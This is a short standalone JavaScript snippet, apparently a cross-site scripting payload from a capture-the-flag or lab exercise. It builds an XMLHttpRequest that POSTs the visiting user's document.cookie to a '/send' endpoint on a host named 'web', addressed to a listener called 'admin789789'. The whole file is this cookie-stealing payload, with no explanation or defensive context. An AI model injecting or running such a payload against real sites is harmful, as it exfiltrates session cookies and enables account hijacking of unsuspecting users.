var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://web:5000/send');
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4 && xhr.status === 200) {
    console.log(xhr.responseText);
  }
};

xhr.send('header=fdsafdsa&listener=admin789789&content=' + document.cookie);
